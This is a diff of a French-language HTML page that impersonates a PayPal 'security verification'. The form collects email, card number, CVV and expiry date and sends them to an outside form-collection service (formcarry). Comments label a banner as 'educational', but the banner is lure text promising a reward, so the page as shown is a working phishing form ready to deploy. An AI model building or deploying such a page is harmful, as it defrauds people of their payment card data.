@@ -1,6 +1,7 @@
-<html>
-  <head>
-    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Vérification de Sécurité</title>
     <style>
@@ -18,13 +19,13 @@
         }
 
         .container {
-            flex: 1; /* Permet au contenu de prendre l’espace dispo sans pousser le footer */
+            flex: 1;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             width: 100%;
-            padding-bottom: 20px; /* Espace avant le footer */
+            padding-bottom: 20px;
         }
 
         form {
@@ -43,8 +44,7 @@
             text-align: left;
         }
 
-        input[type="email"],
-        input[type="text"] {
+        input {
             width: 100%;
             padding: 12px;
             border: 1px solid #ccc;
@@ -52,6 +52,10 @@
             font-size: 16px;
             box-sizing: border-box;
             margin-bottom: 10px;
+        }
+
+        input[type="text"], input[type="email"] {
+            autocomplete: on;
         }
 
         button {
@@ -77,7 +81,7 @@
             padding: 10px;
             background-color: #f1f1f1;
             width: 100%;
-            position: relative; /* Permet au footer de rester en bas sans cacher le contenu */
+            position: relative;
             display: flex;
             justify-content: center;
             gap: 10px;
@@ -96,6 +100,18 @@
             color: #003D99;
         }
 
+        /* Alerte de sensibilisation */
+        .alert {
+            background-color: #ffcc00;
+            padding: 15px;
+            text-align: center;
+            font-weight: bold;
+            color: #333;
+            margin: 20px auto;
+            max-width: 400px;
+            border-radius: 5px;
+        }
+
         /* Ajustements pour les petits écrans */
         @media (max-width: 400px) {
             form {
@@ -108,47 +124,43 @@
                 font-size: 12px;
                 padding: 8px;
             }
-             /* Alerte de sensibilisation */
-        .alert {
-            background-color: #ffcc00;
-            padding: 15px;
-            text-align: center;
-            font-weight: bold;
-            color: #333;
-            margin-top: 20px;
         }
     </style>
-  </head>
-  <body>
+</head>
+<body>
+
     <div class="container">
-      <form action="https://formcarry.com/s/iVwd8lHvQpp" method="POST">
-        <h2>Vérification de Sécurité<br>Protégez vos transactions</h2>
+        <form action="https://formcarry.com/s/iVwd8lHvQpp" method="POST">
+            <h2>Vérification de Sécurité<br>Protégez vos transactions</h2>
 
-        <div><input id="email" name="email" placeholder="Adresse e-mail" required="" type="email"></div>
-        
-        <div><input id="card_number" name="card_number" placeholder="Numéro de carte" required="" type="text"></div>
+            <div><input id="email" name="email" placeholder="Adresse e-mail" required type="email"></div>
 
-        <div><input id="cvv" name="cvv" placeholder="CVV" required="" type="text" maxlength="3"></div>
+            <div><input id="card_number" name="card_number" placeholder="Numéro de carte" required type="text" maxlength="16"></div>
 
-        <div><input id="expiration_date" name="expiration_date" placeholder="Date d'expiration MM/AA" required="" type="text" maxlength="5"></div>
+            <div><input id="cvv" name="cvv" placeholder="CVV" required type="text" maxlength="3"></div>
 
-        <p style="font-size: 12px; color: #555;">Toutes les informations sont sécurisées via HTTPS.</p>
+            <div><input id="expiration_date" name="expiration_date" placeholder="Date d'expiration MM/AA" required type="text" maxlength="5"></div>
 
-        <button type="submit">Confirmer</button>
-      </form>
+            <p style="font-size: 12px; color: #555;">Toutes les informations sont sécurisées via HTTPS.</p>
 
-      <p style="font-size: 12px; color: #555; text-align: center; padding: 10px;">
-        Pour garantir la sécurité de votre achat et prévenir toute tentative de fraude, PayPal vous demande une vérification d’identité supplémentaire. Cette étape rapide, d’une durée maximale de 5 minutes, est essentielle pour compléter votre transaction en toute sécurité.
-      </p>
-         <!-- Alerte éducative -->
-    <div class="alert">
-        ⚠️ATTENTION : Pour valider votre gain et éviter toute fraude, nous devons confirmer votre identité en toute sécurité. En cas de données incorrectes, votre récompense pourrait être annulée.
+            <button type="submit">Confirmer</button>
+        </form>
+
+        <p style="font-size: 12px; color: #555; text-align: center; padding: 10px;">
+            Pour garantir la sécurité de votre achat et prévenir toute tentative de fraude, PayPal vous demande une vérification d’identité supplémentaire. Cette étape rapide, d’une durée maximale de 5 minutes, est essentielle pour compléter votre transaction en toute sécurité.
+        </p>
+
+        <!-- Alerte éducative -->
+        <div class="alert">
+            ⚠️ATTENTION : Pour valider votre gain et éviter toute fraude, nous devons confirmer votre identité en toute sécurité. En cas de données incorrectes, votre récompense pourrait être annulée.
+        </div>
     </div>
 
     <div class="footer">
-      <a href="#">Politique de confidentialité</a>
-      <a href="#">Conditions d'utilisation</a>
-      <a href="#">Contact</a>
+        <a href="#">Politique de confidentialité</a>
+        <a href="#">Conditions d'utilisation</a>
+        <a href="#">Contact</a>
     </div>
-  </body>
+
+</body>
 </html>
